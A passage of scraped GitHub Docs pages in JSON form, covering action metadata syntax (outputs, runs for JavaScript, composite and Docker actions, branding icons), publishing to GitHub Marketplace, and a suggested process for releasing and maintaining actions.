        "text": "Outputs can be a maximum of 1 MB per job. The total of all outputs in a workflow run can be a maximum of 50 MB. Size is approximated based on UTF-16 encoding."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Declaring outputs for composite actions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "outputs:\n  random-number:\n    description: \"Random number\"\n    value: ${{ steps.random-number-generator.outputs.random-id }}\nruns:\n  using: \"composite\"\n  steps:\n    - id: random-number-generator\n      run: echo \"random-id=$(echo $RANDOM)\" >> $GITHUB_OUTPUT\n      shell: bash"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "outputs.<output_id>.value"
      },
      {
        "type": "paragraph",
        "text": "RequiredThe value that the output parameter will be mapped to. You can set this to astringor an expression with context. For example, you can use thestepscontext to set thevalueof an output to the output value of a step."
      },
      {
        "type": "paragraph",
        "text": "For more information on how to use context syntax, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "runs"
      },
      {
        "type": "paragraph",
        "text": "RequiredSpecifies whether this is a JavaScript action, a composite action, or a Docker container action and how the action is executed."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "runsfor JavaScript actions"
      },
      {
        "type": "paragraph",
        "text": "RequiredConfigures the path to the action's code and the runtime used to execute the code."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using Node.js v20"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: 'node20'\n  main: 'main.js'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.usingfor JavaScript actions"
      },
      {
        "type": "paragraph",
        "text": "RequiredThe runtime used to execute the code specified inmain."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Usenode20for Node.js v20."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.main"
      },
      {
        "type": "paragraph",
        "text": "RequiredThe file that contains your action code. The runtime specified inusingexecutes this file."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.pre"
      },
      {
        "type": "paragraph",
        "text": "OptionalAllows you to run a script at the start of a job, before themain:action begins. For example, you can usepre:to run a prerequisite setup script. The runtime specified with theusingsyntax will execute this file. Thepre:action always runs by default but you can override this usingruns.pre-if."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "runs.preis not supported for local actions."
      },
      {
        "type": "paragraph",
        "text": "In this example, thepre:action runs a script calledsetup.js:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: 'node20'\n  pre: 'setup.js'\n  main: 'index.js'\n  post: 'cleanup.js'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.pre-if"
      },
      {
        "type": "paragraph",
        "text": "OptionalAllows you to define conditions for thepre:action execution. Thepre:action will only run if the conditions inpre-ifare met. If not set, thenpre-ifdefaults toalways(). Inpre-if, status check functions evaluate against the job's status, not the action's own status."
      },
      {
        "type": "paragraph",
        "text": "Note that thestepcontext is unavailable, as no steps have run yet."
      },
      {
        "type": "paragraph",
        "text": "In this example,cleanup.jsonly runs on Linux-based runners:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "pre: 'cleanup.js'\n  pre-if: runner.os == 'linux'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.post"
      },
      {
        "type": "paragraph",
        "text": "OptionalAllows you to run a script at the end of a job, once themain:action has completed. For example, you can usepost:to terminate certain processes or remove unneeded files. The runtime specified with theusingsyntax will execute this file."
      },
      {
        "type": "paragraph",
        "text": "In this example, thepost:action runs a script calledcleanup.js:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: 'node20'\n  main: 'index.js'\n  post: 'cleanup.js'"
      },
      {
        "type": "paragraph",
        "text": "Thepost:action always runs by default but you can override this usingpost-if."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.post-if"
      },
      {
        "type": "paragraph",
        "text": "OptionalAllows you to define conditions for thepost:action execution. Thepost:action will only run if the conditions inpost-ifare met. If not set, thenpost-ifdefaults toalways(). Inpost-if, status check functions evaluate against the job's status, not the action's own status."
      },
      {
        "type": "paragraph",
        "text": "For example, thiscleanup.jswill only run on Linux-based runners:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "post: 'cleanup.js'\n  post-if: runner.os == 'linux'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "runsfor composite actions"
      },
      {
        "type": "paragraph",
        "text": "RequiredConfigures the path to the composite action."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.usingfor composite actions"
      },
      {
        "type": "paragraph",
        "text": "RequiredYou must set this value to'composite'."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.steps"
      },
      {
        "type": "paragraph",
        "text": "RequiredThe steps that you plan to run in this action. These can be eitherrunsteps orusessteps."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].run"
      },
      {
        "type": "paragraph",
        "text": "OptionalThe command you want to run. This can be inline or a script in your action repository:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: \"composite\"\n  steps:\n    - run: ${{ github.action_path }}/test/script.sh\n      shell: bash"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can use$GITHUB_ACTION_PATH:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: \"composite\"\n  steps:\n    - run: $GITHUB_ACTION_PATH/script.sh\n      shell: bash"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].shell"
      },
      {
        "type": "paragraph",
        "text": "OptionalThe shell where you want to run the command. You can use any of the shells listed inWorkflow syntax for GitHub Actions. Required ifrunis set."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].if"
      },
      {
        "type": "paragraph",
        "text": "OptionalYou can use theifconditional to prevent a step from running unless a condition is met. You can use any supported context and expression to create a conditional."
      },
      {
        "type": "paragraph",
        "text": "When you use expressions in anifconditional, you can, optionally, omit the${{ }}expression syntax because GitHub Actions automatically evaluates theifconditional as an expression. However, this exception does not apply everywhere."
      },
      {
        "type": "paragraph",
        "text": "You must always use the${{ }}expression syntax or escape with'',\"\", or()when the expression starts with!, since!is reserved notation in YAML format. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "if: ${{ ! startsWith(github.ref, 'refs/tags/') }}"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "paragraph",
        "text": "Example: Using contexts"
      },
      {
        "type": "paragraph",
        "text": "This step only runs when the event type is apull_requestand the event action isunassigned."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - run: echo This event is a pull request that had an assignee removed.\n    if: ${{ github.event_name == 'pull_request' && github.event.action == 'unassigned' }}"
      },
      {
        "type": "paragraph",
        "text": "Example: Using status check functions"
      },
      {
        "type": "paragraph",
        "text": "Themy backup steponly runs when the previous step of a composite action fails. For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: My first step\n    uses: octo-org/action-name@main\n  - name: My backup step\n    if: ${{ failure() }}\n    uses: actions/heroku@1.0.0"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].name"
      },
      {
        "type": "paragraph",
        "text": "OptionalThe name of the composite step."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].id"
      },
      {
        "type": "paragraph",
        "text": "OptionalA unique identifier for the step. You can use theidto reference the step in contexts. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].env"
      },
      {
        "type": "paragraph",
        "text": "OptionalSets amapof environment variables for only that step. If you want to modify the environment variable stored in the workflow, useecho \"{name}={value}\" >> $GITHUB_ENVin a composite step."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].working-directory"
      },
      {
        "type": "paragraph",
        "text": "OptionalSpecifies the working directory where the command is run."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].uses"
      },
      {
        "type": "paragraph",
        "text": "OptionalSelects an action to run as part of a step in your job. An action is a reusable unit of code. You can use an action defined in the same repository as the workflow, a public repository, or in apublished Docker container image."
      },
      {
        "type": "paragraph",
        "text": "We strongly recommend that you include the version of the action you are using by specifying a Git ref, SHA, or Docker tag number. If you don't specify a version, it could break your workflows or cause unexpected behavior when the action owner publishes an update."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using the commit SHA of a released action version is the safest for stability and security.",
          "Using the specific major action version allows you to receive critical fixes and security patches while still maintaining compatibility. It also assures that your workflow should still work.",
          "Using the default branch of an action may be convenient, but if someone releases a new major version with a breaking change, your workflow could break."
        ]
      },
      {
        "type": "paragraph",
        "text": "Some actions require inputs that you must set using thewithkeyword. Review the action's README file to determine the inputs required."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: \"composite\"\n  steps:\n    # Reference a specific commit\n    - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3\n    # Reference the major version of a release\n    - uses: actions/checkout@v4\n    # Reference a specific version\n    - uses: actions/checkout@v4.2.0\n    # Reference a branch\n    - uses: actions/checkout@main\n    # References a subdirectory in a public GitHub repository at a specific branch, ref, or SHA\n    - uses: actions/aws/ec2@main\n    # References a local action\n    - uses: ./.github/actions/my-action\n    # References a docker public registry action\n    - uses: docker://gcr.io/cloud-builders/gradle\n    # Reference a docker image published on docker hub\n    - uses: docker://alpine:3.8"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].with"
      },
      {
        "type": "paragraph",
        "text": "OptionalAmapof the input parameters defined by the action. Each input parameter is a key/value pair. For more information, seeExample: Specifying inputs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: \"composite\"\n  steps:\n    - name: My first step\n      uses: actions/hello_world@main\n      with:\n        first_name: Mona\n        middle_name: The\n        last_name: Octocat"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "runs.steps[*].continue-on-error"
      },
      {
        "type": "paragraph",
        "text": "OptionalPrevents the action from failing when a step fails. Set totrueto allow the action to pass when this step fails."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "runsfor Docker container actions"
      },
      {
        "type": "paragraph",
        "text": "RequiredConfigures the image used for the Docker container action."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a Dockerfile in your repository"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: 'docker'\n  image: 'Dockerfile'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using public Docker registry container"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: 'docker'\n  image: 'docker://debian:stretch-slim'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.usingfor Docker container actions"
      },
      {
        "type": "paragraph",
        "text": "RequiredYou must set this value to'docker'."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.pre-entrypoint"
      },
      {
        "type": "paragraph",
        "text": "OptionalAllows you to run a script before theentrypointaction begins. For example, you can usepre-entrypoint:to run a prerequisite setup script. GitHub Actions usesdocker runto launch this action, and runs the script inside a new container that uses the same base image. This means that the runtime state is different from the mainentrypointcontainer, and any states you require must be accessed in either the workspace,HOME, or as aSTATE_variable. Thepre-entrypoint:action always runs by default but you can override this usingruns.pre-if."
      },
      {
        "type": "paragraph",
        "text": "The runtime specified with theusingsyntax will execute this file."
      },
      {
        "type": "paragraph",
        "text": "In this example, thepre-entrypoint:action runs a script calledsetup.sh:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: 'docker'\n  image: 'Dockerfile'\n  args:\n    - 'bzz'\n  pre-entrypoint: 'setup.sh'\n  entrypoint: 'main.sh'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.image"
      },
      {
        "type": "paragraph",
        "text": "RequiredThe Docker image to use as the container to run the action. The value can be the Docker base image name, a localDockerfilein your repository, or a public image in Docker Hub or another registry. To reference aDockerfilelocal to your repository, the file must be namedDockerfileand you must use a path relative to your action metadata file. Thedockerapplication will execute this file."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.env"
      },
      {
        "type": "paragraph",
        "text": "OptionalSpecifies a key/value map of environment variables to set in the container environment."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.entrypoint"
      },
      {
        "type": "paragraph",
        "text": "OptionalOverrides the DockerENTRYPOINTin theDockerfile, or sets it if one wasn't already specified. Useentrypointwhen theDockerfiledoes not specify anENTRYPOINTor you want to override theENTRYPOINTinstruction. If you omitentrypoint, the commands you specify in the DockerENTRYPOINTinstruction will execute. The DockerENTRYPOINTinstruction has ashellform andexecform. The DockerENTRYPOINTdocumentation recommends using theexecform of theENTRYPOINTinstruction."
      },
      {
        "type": "paragraph",
        "text": "For more information about how theentrypointexecutes, seeDockerfile support for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.post-entrypoint"
      },
      {
        "type": "paragraph",
        "text": "OptionalAllows you to run a cleanup script once theruns.entrypointaction has completed. GitHub Actions usesdocker runto launch this action. Because GitHub Actions runs the script inside a new container using the same base image, the runtime state is different from the mainentrypointcontainer. You can access any state you need in either the workspace,HOME, or as aSTATE_variable. Thepost-entrypoint:action always runs by default but you can override this usingruns.post-if."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: 'docker'\n  image: 'Dockerfile'\n  args:\n    - 'bzz'\n  entrypoint: 'main.sh'\n  post-entrypoint: 'cleanup.sh'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "runs.args"
      },
      {
        "type": "paragraph",
        "text": "OptionalAn array of strings that define the inputs for a Docker container. Inputs can include hardcoded strings. GitHub passes theargsto the container'sENTRYPOINTwhen the container starts up."
      },
      {
        "type": "paragraph",
        "text": "Theargsare used in place of theCMDinstruction in aDockerfile. If you useCMDin yourDockerfile, use the guidelines ordered by preference:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Document required arguments in the action's README and omit them from theCMDinstruction.",
          "Use defaults that allow using the action without specifying anyargs.",
          "If the action exposes a--helpflag, or something similar, use that to make your action self-documenting."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you need to pass environment variables into an action, make sure your action runs a command shell to perform variable substitution. For example, if yourentrypointattribute is set to\"sh -c\",argswill be run in a command shell. Alternatively, if yourDockerfileuses anENTRYPOINTto run the same command (\"sh -c\"),argswill execute in a command shell."
      },
      {
        "type": "paragraph",
        "text": "For more information about using theCMDinstruction with GitHub Actions, seeDockerfile support for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Defining arguments for the Docker container"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs:\n  using: 'docker'\n  image: 'Dockerfile'\n  args:\n    - ${{ inputs.greeting }}\n    - 'foo'\n    - 'bar'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "branding"
      },
      {
        "type": "paragraph",
        "text": "OptionalYou can use a color andFeathericon to create a badge to personalize and distinguish your action. Badges are shown next to your action name inGitHub Marketplace."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Configuring branding for an action"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "branding:\n  icon: 'award'\n  color: 'green'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "branding.color"
      },
      {
        "type": "paragraph",
        "text": "The background color of the badge. Can be one of:white,black,yellow,blue,green,orange,red,purple, orgray-dark."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "branding.icon"
      },
      {
        "type": "paragraph",
        "text": "The name of the v4.28.0Feathericon to use."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Omitted icons"
      },
      {
        "type": "paragraph",
        "text": "Brand icons, and all the following icons, are omitted."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "coffee",
          "columns",
          "divide-circle",
          "divide-square",
          "divide",
          "frown",
          "hexagon",
          "key",
          "meh",
          "mouse-pointer",
          "smile",
          "tool",
          "x-octagon"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Exhaustive list of all currently supported icons"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "activity",
          "airplay",
          "alert-circle",
          "alert-octagon",
          "alert-triangle",
          "align-center",
          "align-justify",
          "align-left",
          "align-right",
          "anchor",
          "aperture",
          "archive",
          "arrow-down-circle",
          "arrow-down-left",
          "arrow-down-right",
          "arrow-down",
          "arrow-left-circle",
          "arrow-left",
          "arrow-right-circle",
          "arrow-right",
          "arrow-up-circle",
          "arrow-up-left",
          "arrow-up-right",
          "arrow-up",
          "at-sign",
          "award",
          "bar-chart-2",
          "bar-chart",
          "battery-charging",
          "battery",
          "bell-off",
          "bell",
          "bluetooth",
          "bold",
          "book-open",
          "book",
          "bookmark",
          "box",
          "briefcase",
          "calendar",
          "camera-off",
          "camera",
          "cast",
          "check-circle",
          "check-square",
          "check",
          "chevron-down",
          "chevron-left",
          "chevron-right",
          "chevron-up",
          "chevrons-down",
          "chevrons-left",
          "chevrons-right",
          "chevrons-up",
          "circle",
          "clipboard",
          "clock",
          "cloud-drizzle",
          "cloud-lightning",
          "cloud-off",
          "cloud-rain",
          "cloud-snow",
          "cloud",
          "code",
          "command",
          "compass",
          "copy",
          "corner-down-left",
          "corner-down-right",
          "corner-left-down",
          "corner-left-up",
          "corner-right-down",
          "corner-right-up",
          "corner-up-left",
          "corner-up-right",
          "cpu",
          "credit-card",
          "crop",
          "crosshair",
          "database",
          "delete",
          "disc",
          "dollar-sign",
          "download-cloud",
          "download",
          "droplet",
          "edit-2",
          "edit-3",
          "edit",
          "external-link",
          "eye-off",
          "eye",
          "fast-forward",
          "feather",
          "file-minus",
          "file-plus",
          "file-text",
          "file",
          "film",
          "filter",
          "flag",
          "folder-minus",
          "folder-plus",
          "folder",
          "gift",
          "git-branch",
          "git-commit",
          "git-merge",
          "git-pull-request",
          "globe",
          "grid",
          "hard-drive",
          "hash",
          "headphones",
          "heart",
          "help-circle",
          "home",
          "image",
          "inbox",
          "info",
          "italic",
          "layers",
          "layout",
          "life-buoy",
          "link-2",
          "link",
          "list",
          "loader",
          "lock",
          "log-in",
          "log-out",
          "mail",
          "map-pin",
          "map",
          "maximize-2",
          "maximize",
          "menu",
          "message-circle",
          "message-square",
          "mic-off",
          "mic",
          "minimize-2",
          "minimize",
          "minus-circle",
          "minus-square",
          "minus",
          "monitor",
          "moon",
          "more-horizontal",
          "more-vertical",
          "move",
          "music",
          "navigation-2",
          "navigation",
          "octagon",
          "package",
          "paperclip",
          "pause-circle",
          "pause",
          "percent",
          "phone-call",
          "phone-forwarded",
          "phone-incoming",
          "phone-missed",
          "phone-off",
          "phone-outgoing",
          "phone",
          "pie-chart",
          "play-circle",
          "play",
          "plus-circle",
          "plus-square",
          "plus",
          "pocket",
          "power",
          "printer",
          "radio",
          "refresh-ccw",
          "refresh-cw",
          "repeat",
          "rewind",
          "rotate-ccw",
          "rotate-cw",
          "rss",
          "save",
          "scissors",
          "search",
          "send",
          "server",
          "settings",
          "share-2",
          "share",
          "shield-off",
          "shield",
          "shopping-bag",
          "shopping-cart",
          "shuffle",
          "sidebar",
          "skip-back",
          "skip-forward",
          "slash",
          "sliders",
          "smartphone",
          "speaker",
          "square",
          "star",
          "stop-circle",
          "sun",
          "sunrise",
          "sunset",
          "table",
          "tablet",
          "tag",
          "target",
          "terminal",
          "thermometer",
          "thumbs-down",
          "thumbs-up",
          "toggle-left",
          "toggle-right",
          "trash-2",
          "trash",
          "trending-down",
          "trending-up",
          "triangle",
          "truck",
          "tv",
          "type",
          "umbrella",
          "underline",
          "unlock",
          "upload-cloud",
          "upload",
          "user-check",
          "user-minus",
          "user-plus",
          "user-x",
          "user",
          "users",
          "video-off",
          "video",
          "voicemail",
          "volume-1",
          "volume-2",
          "volume-x",
          "volume",
          "watch",
          "wifi-off",
          "wifi",
          "wind",
          "x-circle",
          "x-square",
          "x",
          "zap-off",
          "zap",
          "zoom-in",
          "zoom-out"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Changing the metadata file name"
      },
      {
        "type": "paragraph",
        "text": "While the actions metadata file supports both YAML formats, changing the metadata file name (fromaction.ymltoaction.yamlor vice versa) between releases will affect previous release versions that have been published to GitHub Marketplace. Changing the file name will hide all release versions associated with the previous file name from GitHub Marketplace. Previous release versions will still be accessible to users through the source repository."
      },
      {
        "type": "paragraph",
        "text": "When releasing new versions of actions, only versions released after the metadata file name change will have the GitHub Marketplace tag and will show up on GitHub Marketplace"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace",
    "content": [
      {
        "type": "paragraph",
        "text": "You must accept the terms of service to publish actions in GitHub Marketplace."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About publishing actions"
      },
      {
        "type": "paragraph",
        "text": "Before you can publish an action, you'll need to create an action in your repository. For more information, seeSharing automations."
      },
      {
        "type": "paragraph",
        "text": "When you plan to publish your action to GitHub Marketplace, you'll need to ensure that the repository only includes the metadata file, code, and files necessary for the action. Creating a single repository for the action allows you to tag, release, and package the code in a single unit. GitHub also uses the action's metadata on your GitHub Marketplace page."
      },
      {
        "type": "paragraph",
        "text": "Actions are published to GitHub Marketplace immediately and aren't reviewed by GitHub as long as they meet these requirements:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The action must be in a public repository.",
          "Each repository must contain a single action metadata file (action.ymloraction.yaml) at the root.Repositories may include other actions metadata files in sub-folders, but they will not be automatically listed in the marketplace.",
          "Repositories may include other actions metadata files in sub-folders, but they will not be automatically listed in the marketplace.",
          "Each repository mustnotcontain any workflow files.",
          "Thenamein the action's metadata file must be unique.Thenamecannot match an existing action name published on GitHub Marketplace.Thenamecannot match a user or organization on GitHub, unless the user or organization owner is publishing the action. For example, only the GitHub organization can publish an action namedgithub.Thenamecannot match an existing GitHub Marketplace category.GitHub reserves the names of GitHub features.",
          "Thenamecannot match an existing action name published on GitHub Marketplace.",
          "Thenamecannot match a user or organization on GitHub, unless the user or organization owner is publishing the action. For example, only the GitHub organization can publish an action namedgithub.",
          "Thenamecannot match an existing GitHub Marketplace category.",
          "GitHub reserves the names of GitHub features."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing an action"
      },
      {
        "type": "paragraph",
        "text": "You can add the action you've created to GitHub Marketplace by tagging it as a new release and publishing it."
      },
      {
        "type": "paragraph",
        "text": "To draft a new release and publish the action to GitHub Marketplace, follow these instructions:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Navigate to the action metadata file in your repository (action.yml), and you'll see a banner to publish the action to GitHub Marketplace. ClickDraft a release.",
          "Under \"Release Action\", selectPublish this Action to the GitHub Marketplace.NoteThe \"Publish\" checkbox is disabled if the account that owns the repository has not yet accepted the GitHub Marketplace Developer Agreement. If you own the repository or are an organization owner, click the link to \"accept the GitHub Marketplace Developer Agreement\", then accept the agreement. If there is no link, send the organization owner a link to this \"Release Action\" page and ask them to accept the agreement.",
          "If the labels in your metadata file contain any problems, you will see an error message or a warning message. Address them by updating your metadata file. Once complete, you will see an \"Everything looks good!\" message.",
          "Select thePrimary Categorydropdown menu and click a category that will help people find your action in GitHub Marketplace.",
          "Optionally, select theAnother Categorydropdown menu and click a secondary category.",
          "In the tag field, type a version for your action. This helps people know what changes or features the release includes. People will see the version in the action's dedicated GitHub Marketplace page.",
          "In the title field, type a release title.",
          "Complete all other fields and clickPublish release. Publishing requires you to use two-factor authentication. For more information, seeConfiguring two-factor authentication."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Removing an action from GitHub Marketplace"
      },
      {
        "type": "paragraph",
        "text": "To remove a published action from GitHub Marketplace, you'll need to update each published release. Perform the following steps for each release of the action you've published to GitHub Marketplace."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "To the right of the list of files, clickReleases.",
          "Next to the release you want to edit, click.",
          "SelectPublish this action to the GitHub Marketplaceto remove the check from the box.",
          "ClickUpdate releaseat the bottom of the page."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Transferring an action repository"
      },
      {
        "type": "paragraph",
        "text": "You can transfer an action repository to another user or organization. For more information, seeTransferring a repository."
      },
      {
        "type": "paragraph",
        "text": "When a repository admin transfers an action repository, GitHub automatically creates a redirect from the previous URL to the new URL, meaning workflows that use the affected action do not need to be updated."
      },
      {
        "type": "paragraph",
        "text": "Actions published on GitHub Marketplace are linked to a repository by their uniquenameidentifier, meaning you can publish new releases of an action from the transferred repository under the same GitHub Marketplace listing. If an action repository is deleted, the GitHub Marketplace listing is also deleted, and the uniquenameidentifier becomes available."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The \"Verified\" badge seen on an organization's GitHub profile is different from the verified creator badge on GitHub Marketplace. If you transfer an action repository, the GitHub Marketplace listing will lose the verified creator badge unless the new owner is also a verified creator."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About badges in GitHub Marketplace"
      },
      {
        "type": "paragraph",
        "text": "Actions with the, or verified creator badge, indicate that GitHub has verified the creator of the action as a partner organization. Partners can emailpartnerships@github.comto request the verified creator badge."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "After you create an action, you'll want to continue releasing new features while working with community contributions. This tutorial describes an example process you can follow to release and maintain actions in open source. The example:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Leverages GitHub Actions for continuous integration, dependency updates, release management, and task automation.",
          "Provides confidence through automated tests and build badges.",
          "Indicates how the action can be used, ideally as part of a broader workflow.",
          "Signal what type of community contributions you welcome. (For example, issues, pull requests, or vulnerability reports.)"
        ]
      },
      {
        "type": "paragraph",
        "text": "For an applied example of this process, seeactions/javascript-action."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Developing and releasing actions"
      },
      {
        "type": "paragraph",
        "text": "In this section, we discuss an example process for developing and releasing actions and show how to use GitHub Actions to automate the process."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About JavaScript actions"
      },
      {
        "type": "paragraph",
        "text": "JavaScript actions are Node.js repositories with metadata. However, JavaScript actions have additional properties compared to traditional Node.js projects:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Dependent packages are committed alongside the code, typically in a compiled and minified form. This means that automated builds and secure community contributions are important.",
          "Tagged releases can be published directly to GitHub Marketplace and consumed by workflows across GitHub.",
          "Many actions make use of GitHub's APIs and third party APIs, so we encourage robust end-to-end testing."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Setting up GitHub Actions workflows"
      },
      {
        "type": "paragraph",
        "text": "To support the developer process in the next section, add two GitHub Actions workflows to your repository:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Add a workflow that triggers when a commit is pushed to a feature branch or tomainor when a pull request is created. Configure the workflow to run your unit and integration tests. For an example, seethis workflow.",
          "Add a workflow that triggers when a release is published or edited. Configure the workflow to ensure semantic tags are in place. You can use an action likeJasonEtco/build-and-tag-actionto compile and bundle the JavaScript and metadata file and force push semantic major, minor, and patch tags. For more information about semantic tags, seeAbout semantic versioning."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example developer process"
      },
      {
        "type": "paragraph",
        "text": "Here is an example process that you can follow to automatically run tests, create a release and publish to GitHub Marketplace, and publish your action."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Do feature work in branches per GitHub flow. For more information, seeGitHub flow.Whenever a commit is pushed to the feature branch, your testing workflow will automatically run the tests.",
          "Whenever a commit is pushed to the feature branch, your testing workflow will automatically run the tests.",
          "Create pull requests to themainbranch to initiate discussion and review, merging when ready.When a pull request is opened, either from a branch or a fork, your testing workflow will again run the tests, this time with the merge commit.Note:for security reasons, workflows triggered bypull_requestfrom forks have restrictedGITHUB_TOKENpermissions and do not have access to secrets. If your tests or other workflows triggered upon pull request require access to secrets, consider using a different event like amanual triggeror apull_request_target. For more information, seeEvents that trigger workflows.",
          "When a pull request is opened, either from a branch or a fork, your testing workflow will again run the tests, this time with the merge commit.",
          "Note:for security reasons, workflows triggered bypull_requestfrom forks have restrictedGITHUB_TOKENpermissions and do not have access to secrets. If your tests or other workflows triggered upon pull request require access to secrets, consider using a different event like amanual triggeror apull_request_target. For more information, seeEvents that trigger workflows.",
          "Create a semantically tagged release.  You may also publish to GitHub Marketplace with a simple checkbox.  For more information, seeManaging releases in a repositoryandPublishing actions in GitHub Marketplace.When a release is published or edited, your release workflow will automatically take care of compilation and adjusting tags.We recommend creating releases using semantically versioned tags – for example,v1.1.3– and keeping major (v1) and minor (v1.1) tags current to the latest appropriate commit. For more information, seeAbout custom actionsandAbout semantic versioning.",
          "When a release is published or edited, your release workflow will automatically take care of compilation and adjusting tags.",
          "We recommend creating releases using semantically versioned tags – for example,v1.1.3– and keeping major (v1) and minor (v1.1) tags current to the latest appropriate commit. For more information, seeAbout custom actionsandAbout semantic versioning."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Results"
      },
      {
        "type": "paragraph",
        "text": "Unlike some other automated release management strategies, this process intentionally does not commit dependencies to themainbranch, only to the tagged release commits. By doing so, you encourage users of your action to reference named tags orshas, and you help ensure the security of third party pull requests by doing the build yourself during a release."
      },
      {
        "type": "paragraph",
        "text": "Using semantic releases means that the users of your actions can pin their workflows to a version and know that they might continue to receive the latest stable, non-breaking features, depending on their comfort level."
